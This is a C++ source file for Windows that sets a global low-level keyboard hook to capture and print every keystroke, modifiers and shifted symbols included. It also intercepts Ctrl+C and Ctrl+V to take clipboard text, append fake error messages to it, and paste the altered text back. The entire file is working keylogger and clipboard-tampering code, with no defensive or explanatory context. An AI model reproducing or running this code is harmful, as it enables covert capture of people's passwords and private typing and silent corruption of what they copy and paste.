#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <vector>     //For clipboardQueue
#include <stdlib.h>   //For rand()
#include <time.h>       /* time */

std::string WRITE_FILE = "output.txt";
std::vector<char*> clipboardQueue;

void WriteToFile(char* input)
{
  std::ofstream outputFile;
  outputFile.open(WRITE_FILE, std::fstream::app);

  std::cout << input;
  outputFile << input;
  outputFile.close();

  return;
}

//The function that implements the key logging functionality
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
  //The last nCode value
	static int last;

  //Flags to determine if shift is active
  bool activeShift = GetAsyncKeyState(VK_SHIFT);
  bool activeCaps = GetKeyState(VK_CAPITAL);
  bool capitalLetter = !((activeCaps && activeShift) || (!activeCaps && !activeShift));
  //std::cout << "\nCapital? -> " << capitalLetter << std::endl;

  if(nCode == HC_ACTION) {
		if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			int code = p->vkCode;

      //Checks if ctr+c is hit
      if (code == 0x43 && GetKeyState(VK_CONTROL) & 0x8000) {
          WM_COPY;
          Sleep(500);
          OpenClipboard(NULL);
          char* buffer;
          buffer = (char*)GetClipboardData(CF_TEXT);

          //Checks buffer length and changes it accordingly
          if (strlen(buffer) >= 10) {
            strcat (buffer, "(Error, string exceeds suitable char count.");
            strcat (buffer, " <Error code 0xc00904le>)");
          } else {
            strcat (buffer, "s");
            strcat (buffer, " (Something went wrong. Clipboard <Error code 0xc00583cb>)");
          }

          //Closes clipboard and pushes the buffer to the queue
          CloseClipboard();
          clipboardQueue.push_back(buffer);

      //Checks if ctr + v is hit
      } else if (code == 0x56 && GetKeyState(VK_CONTROL) & 0x8000) { // ctrl-v is pressed
          if (clipboardQueue.size() > 0) {
              //Sets the output equal to the queue
              const char* output = clipboardQueue[0];
              const size_t len = strlen(output) + 1;
              HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
              memcpy(GlobalLock(hMem), output, len);
              GlobalUnlock(hMem);

              //Pushes data and pastes the clipboard
              OpenClipboard(0);
              EmptyClipboard();
              SetClipboardData(CF_TEXT, hMem);
              CloseClipboard();
              WM_PASTE;
              clipboardQueue.erase(clipboardQueue.begin());
          }
      }

      if (code == VK_CAPITAL) {
        if (last != VK_CAPITAL) {
          printf("%s", "<CAPS>");
        }
      }

      if(code == VK_LCONTROL) {
        if (last != VK_LCONTROL) {
          printf("%s", "<LCTRL>");
        }
			}

			if(code == VK_RCONTROL) {
        if (last != VK_RCONTROL) {
          printf("%s", "<RCTRL>");
        }
      }

      if(code == VK_RMENU) { // RALT
        if (last != VK_RMENU) {
          printf("%s", "<RALT>");
        }
      }

			if(code == VK_LMENU) {
        if (last != VK_LMENU) {
          printf("%s", "<LALT>");
        }
			}

			if(code == VK_LSHIFT) {
				if (last != VK_LSHIFT) {
          printf("%s", "<LSHIFT>");
        }
      }

			if(code == VK_RSHIFT) {
				if (last != VK_RSHIFT) {
          printf("%s", "<RSHIFT>");
        }
      }

			if(code == VK_BACK) {
				printf("\b");
			}

      if(code == VK_RETURN) {
        printf("\n");
      }

			if(code == VK_OEM_1) {
        if (activeShift)
			    printf(":");
        else
          printf(";");
			}

      if (code == VK_OEM_PLUS) {
        if (activeShift)
			    printf("+");
        else
          printf("=");
      }

      if (code == VK_OEM_COMMA) {
        if (activeShift)
          printf("<");
        else
          printf(",");
      }

      if (code == VK_OEM_MINUS) {
        if (activeShift)
          printf("_");
        else
          printf("-");
      }

      if (code == VK_OEM_PERIOD) {
        if (activeShift)
          printf(">");
        else
          printf(".");
      }

      if (code == VK_OEM_2) {
        if (activeShift)
          printf("?");
        else
          printf("/");
      }

      if (code == VK_OEM_3) {
        if (activeShift)
			    printf("~");
        else
          printf("`");
      }

      if (code == VK_OEM_4) {
        if (activeShift)
			    printf("{");
        else
          printf("[");
      }

      if (code == VK_OEM_5) {
        if (activeShift)
          printf("|");
        else
          printf("\\");
      }

      if (code == VK_OEM_6) {
        if (activeShift)
          printf("}");
        else
          printf("]");
      }

      if (code == VK_OEM_7) {
        if (activeShift)
			    printf("\"");
        else
          printf("\'");
      }

      if (code == VK_LWIN) {
        printf("%s", "<WIN>");
      }

      if (code == VK_TAB) {
        printf("%s", "<TAB>");
      }

      if (code == VK_ESCAPE) {
        printf("%s", "<ESC>");
      }

      if (code == VK_SPACE) {
        printf(" ");
      }

      //letter A-Z pressed
			if(code >= 0x41 && code <= 0x5A) {
        if (!capitalLetter) {
          code += 32;
        }
				printf("%c", code);
			}

      //number 0-9 pressed
      if (code >= 0x30 && code <= 0x39) {
        if (activeShift) {
          if (code == 0x31) {
            printf("!");
          }
          if (code == 0x32) {
            printf("@");
          }
          if (code == 0x33) {
            printf("#");
          }
          if (code == 0x34) {
            printf("$");
          }
          if (code == 0x35) {
            printf("%");
          }
          if (code == 0x36) {
            printf("^");
          }
          if (code == 0x37) {
            printf("&");
          }
          if (code == 0x38) {
            printf("*");
          }
          if (code == 0x39) {
            printf("(");
          }
          if (code == 0x30) {
            printf(")");
          }
        }
        else {
          printf("%c", code);
        }
      }

      last = code;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, _TCHAR *argv[])
{
  //std::cout<<std::string(std::getenv("HOMEPATH")).substr((std::string(std::getenv("HOMEPATH") ).rfind("\\") ) + 1, (std::string(std::getenv("HOMEPATH")).length()-1) )  <<std::endl;
  srand(time(NULL));

  //Retrieve the applications instance
  HINSTANCE instance = GetModuleHandle(NULL);

  //Open clipboard
  OpenClipboard(NULL);
  EmptyClipboard();
  CloseClipboard();

  //Set a global Windows Hook to capture keystrokes using the function declared above
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);

  //Message loop
  MSG Msg;
  while(GetMessage(&Msg, NULL, 0, 0) > 0)
  {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
  }

  return 0;
}
